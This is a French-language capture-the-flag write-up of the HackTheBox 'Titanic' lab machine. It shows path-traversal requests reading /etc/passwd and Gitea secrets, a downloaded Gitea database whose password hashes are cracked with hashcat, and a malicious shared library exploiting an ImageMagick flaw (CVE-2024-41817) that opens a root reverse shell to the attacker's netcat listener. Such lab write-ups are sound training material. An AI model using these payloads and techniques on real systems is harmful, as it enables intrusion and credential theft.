---
title: HTB | Titanic
description: Titanic is an easy difficulty Linux machine that features an Apache server listening on port 80. The website on port 80 advertises the amenities of the legendary Titanic ship and allows users to book trips. A second vHost is also identified after fuzzing, which points to a Gitea server. The Gitea server allows registrations, and exploration of the available repositories reveals some interesting information including the location of a mounted Gitea data folder, which is running via a Docker container. Back to the original website, the booking functionality is found to be vulnerable to an Arbitrary File Read exploit, and combining the directory identified from Gitea, it is possible to download the Gitea SQLite database locally. Said database contains hashed credentials for the developer user, which can be cracked. The credentials can then be used to login to the remote system over SSH. Enumeration of the file system reveals that a script in the /opt/scripts directory is being executed every minute. This script is running the magick binary in order to gather information about specific images. This version of magick is found to be vulnerable to an arbitrary code execution exploit assigned CVE-2024-41817. Successful exploitation of this vulnerability results in elevation of privileges to the root user.
slug: titanic-htb
date: 2025-02-21 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Titanic cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Titanic</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.55</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
developer : `25282528`
```

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~/htb/Titanic]
└─$ nmap -sC -sV -An -T4 -vvv -p- 10.10.11.55
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

## Foothold

### Website titanic.htb : LFI
On a un formulaire qu'on peut remplir pour reserver notre voyage. A la fin, ça nous fait telecharger un fichier .json avec notre ticket. Or, si on maniule cet argument ticket= on peut récupérer le contenu de n'importe quel fichier
```bash
GET /download?ticket=../../../../../../../../etc/passwd HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-------------------------------

HTTP/1.1 200 OK
Date: Wed, 19 Feb 2025 12:47:55 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="../../../../../../../../etc/passwd"
Content-Type: application/octet-stream
Content-Length: 1951
Last-Modified: Fri, 07 Feb 2025 11:16:19 GMT
Cache-Control: no-cache
ETag: "1738926979.4294043-1951-2222001821"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
Grâce à /etc/passwd on repère l'utilisateur "developer". On peut récupérer le fichier user.txt avec le flag.
```bash
GET /download?ticket=../../../../../../../../home/developer/user.txt HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------------------------
HTTP/1.1 200 OK
Date: Wed, 19 Feb 2025 12:48:04 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="../../../../../../../../home/developer/user.txt"
Content-Type: text/plain; charset=utf-8
Content-Length: 33
Last-Modified: Wed, 19 Feb 2025 12:36:23 GMT
Cache-Control: no-cache
ETag: "1739968583.7440214-33-1704137658"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

fc0c.....550f
```

```bash
<VirtualHost *:80>
    ServerName titanic.htb
    DocumentRoot /var/www/html

    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ProxyRequests Off
    ProxyPass / http://127.0.0.1:5000/
    ProxyPassReverse / http://127.0.0.1:5000/

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
    
    
    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^titanic.htb$
    RewriteRule ^(.*)$ http://titanic.htb$1 [R=permanent,L]
</VirtualHost>
```

### dev subdomain : dev.titanic.htb
En utilisant ffuf, on trouve un subdomain "dev". On aurait pu y penser autrement, en effet l'utilisateur trouvé précédemment était "developer".
En vérité, j'ai trouvé cela en regarder la fichier /etc/hosts grâce à la LFI trouvé précedemment:
```bash
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic
```
ATTENTION !! Le piège : on ne trouve rien avec `gobuster dns`. A l'avenir, il faut prioriser ABSOLUMENT `ffuf` pour trouver les sous-domaines !!

Cette commande ne trouve rien :
> gobuster dns -d titanic.htb -w /usr/share/wordlists/dirb/common.txt
```bash
┌──(kali㉿kali)-[~/htb/Titanic]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://titanic.htb/ -H "Host: FUZZ.titanic.htb" -mc 200 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

dev                     [Status: 200, Size: 13983, Words: 1107, Lines: 276, Duration: 135ms]
```

### Gitea
**dev.titanic.htb** redirige vers une page **Gitea**.

### Mysql password
```bash
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

### Fuzzing with ffuf
En faisant du fuzzing avec des plusieurs wordlists, on finit par trouver le fichier **app.ini** et surtout le working directory de gitea.
Sur l'interface web de gitea on avait trouvé l'info le dossier :
/home/developer/gitea/data

Mais il m'a fallu beaucoup de temps/fuzzing pour trouver qu'il fallait à nouveau écrire gitea...

J'ai utilisé la LFI, sous forme d'une requete ".req" récupérer sur BURP. Je mettais le mot "FUZZ" au bonne endroit dans la requete, donc apres le dossier data au début.
```bash
GET /download?ticket=/home/developer/gitea/data/FUZZ HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
Voici l'execution de ffuf ensuite en utilisant notre requete et une liste de mot de passe:
```bash
┌──(kali㉿kali)-[~/htb/Titanic]
└─$ ffuf -request download.req -request-proto http -t 64 -w ./gitea_wordlist.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb/download?ticket=/home/developer/gitea/data/FUZZ
 :: Wordlist         : FUZZ: /home/kali/htb/Titanic/gitea_wordlist.txt
 :: Header           : Connection: keep-alive
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Priority: u=0, i
 :: Header           : Host: titanic.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 64
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

gitea                   [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 139ms]
:: Progress: [2876/2876] :: Job [1/1] :: 404 req/sec :: Duration: [0:00:06] :: Errors: 0 ::

-----------on rajoute "/gitea/FUZZ" dans le fichier .req et on recommence la recherche----------------

┌──(kali㉿kali)-[~/htb/Titanic]
└─$ ffuf -request download.req -request-proto http -t 64 -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: titanic.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: keep-alive
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Priority: u=0, i
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 64
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 104ms]
attachments             [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 149ms]
avatars                 [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 137ms]
conf                    [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 141ms]
home                    [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 156ms]
log                     [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 156ms]
packages                [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 267ms]
queues                  [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 249ms]
sessions                [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 225ms]
tmp                     [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 229ms]
:: Progress: [4614/4614] :: Job [1/1] :: 266 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```
On observe l'utilisation d'une "gitea_wordlist.txt". Je l'ai créer en récupérer le code source sur github, puis j'ai utilisé la commande suivante :
```bash
find ./gitea-1.22.1/ -type f -exec basename {} \; > gitea_wordlist.txt 
```

```bash
GET /download?ticket=/home/developer/gitea/data/gitea/conf/app.ini HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-------------------------

HTTP/1.1 200 OK
Date: Wed, 19 Feb 2025 22:34:22 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="/home/developer/gitea/data/gitea/conf/app.ini"
Content-Type: application/octet-stream
Content-Length: 2004
Last-Modified: Fri, 02 Aug 2024 10:42:14 GMT
Cache-Control: no-cache
ETag: "1722595334.8970726-2004-2176520380"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
```

### Gitea.db : developer user
```bash
curl "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" --output ./gitea.db
```

```bash
┌──(kali㉿kali)-[~/htb/Titanic]
└─$ sqlite3 ./gitea.db                                      
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> select * from user;
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
3|a|a||a@a.com|0|enabled|0ae3825641016406643a122f7f3ca6c6b5cfc76abd40075f73eb8deff4cce5448bfa95dc5a4ff81d62cb77921cd224b2010d|pbkdf2$50000$50|0|0|0||0|||314efc292d5e9576a2154e9bc85facb8|24fc79c6b2aadeb9555d40312ac55460|en-US||1739990352|1739990365|1739990352|0|-1|1|0|0|0|0|1|0|d10ca8d11301c2f4993ac2279ce4b930|a@a.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
```

### Hashcat bruteforce

compte crée:
b : 123456789

```bash
4|b|b||b@b.com|0|enabled|097c3c0cdbf50b536b20ef5e22b6dd8e58fbfa6230003f60a6a15577107d48618814da5e1c2984e3775fdbea3f61c41cd0ce|pbkdf2$50000$50|0|0|0||0|||d49587abbc61243dfde5146bec7ee24b|47b1683e379bca325752efd85fe1c31b|en-US||1740008072|1740008072|1740008072|0|-1|1|0|0|0|0|1|0|2076105f6efe7c11e285add95f514b9a|b@b.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
```

┌──(kali㉿kali)-[~/htb/Titanic]
└─$ john --list=format-details --format=pbkdf2-hmac-sha256

PBKDF2-HMAC-SHA256      125     24      192     01000003        48      PBKDF2-SHA256 256/256 AVX2 8x                   0x107   32      188     iteration count 0       $pbkdf2-sha256$1000$b1dWS2dab3dKQWhPSUg3cg$UY9j5wlyxtsJqhDKTqua8Q3fMp0ojc2pOnErzr8ntLE

sqlite> select name, passwd_hash_algo, salt, passwd from user;
administrator|pbkdf2$50000$50|2d149e5fbd1b20cf31db3e3c6a28fc9b|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136
developer|pbkdf2$50000$50|8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
a|pbkdf2$50000$50|24fc79c6b2aadeb9555d40312ac55460|0ae3825641016406643a122f7f3ca6c6b5cfc76abd40075f73eb8deff4cce5448bfa95dc5a4ff81d62cb77921cd224b2010d
b|pbkdf2$50000$50|47b1683e379bca325752efd85fe1c31b|097c3c0cdbf50b536b20ef5e22b6dd8e58fbfa6230003f60a6a15577107d48618814da5e1c2984e3775fdbea3f61c41cd0ce

Ce qui nous donne :

sha256:50000:2d149e5fbd1b20cf31db3e3c6a28fc9b:cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136
sha256:50000:8bf3e3452b78544f8bee9400d6936d34:e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
sha256:50000:24fc79c6b2aadeb9555d40312ac55460:0ae3825641016406643a122f7f3ca6c6b5cfc76abd40075f73eb8deff4cce5448bfa95dc5a4ff81d62cb77921cd224b2010d
sha256:50000:47b1683e379bca325752efd85fe1c31b:097c3c0cdbf50b536b20ef5e22b6dd8e58fbfa6230003f60a6a15577107d48618814da5e1c2984e3775fdbea3f61c41cd0ce

Enfin, en format hashcat avec du base64:

sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
sha256:50000:JPx5xrKq3rlVXUAxKsVUYA==:CuOCVkEBZAZkOhIvfzymxrXPx2q9QAdfc+uN7/TM5USL+pXcWk/4HWLLd5Ic0iSyAQ0=
sha256:50000:R7FoPjebyjJXUu/YX+HDGw==:CXw8DNv1C1NrIO9eIrbdjlj7+mIwAD9gpqFVdxB9SGGIFNpeHCmE43df2+o/YcQc0M4=

On trouve ensuite le mot de passe developer en utilisant hashcat :
```bash
$ hashcat -m 10900 hash_final.txt.b64 ~/wordlists/rockyou.txt
hashcat (v6.2.5) starting
...

Dictionary cache hit:
* Filename..: /home/leopold/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139922195
* Keyspace..: 14344385

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```
developer : `25282528`

## Privilege Escalation

### Exploitation : Image Magick 
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

```bash
developer@titanic:/opt/app/static/assets/images$ find / -writable -type d 2>/dev/null | head
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/dbus.socket
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/gpg-agent.service
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/dbus.service
/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/init.scope
/opt/app/static/assets/images
/opt/app/tickets
/home/developer
/home/developer/.gnupg
```
On trouve ces dossiers:
/opt/app/static/assets/images
/opt/app/tickets

Avec ce script:

```bash
developer@titanic:/opt/app/static/assets/images$ cat /opt/scripts/identify_images.sh 
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

On recherche une CVE pour magick, on trouve que notre version est vulnerable. On trouve le github, on suit les instructions.
On construit une fausse librairie qui va executer du code en tant que root. il execute un shell.sh que j'ai defini et qui ouvre un revershell.
```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
##include <stdio.h>
##include <stdlib.h>
##include <unistd.h>

__attribute__((constructor)) void init(){
    system("/opt/app/static/assets/images/shell.sh");
    exit(0);
}
EOF
```

```bash
┌──(kali㉿kali)-[~/htb/Titanic]
└─$ nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.55] 51460
sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
c304.....3cde
```

## Tips
- ATTENTION !! Le piège : on ne trouve rien avec `gobuster dns`. A l'avenir, il faut prioriser ABSOLUMENT `ffuf` pour trouver les sous-domaines !!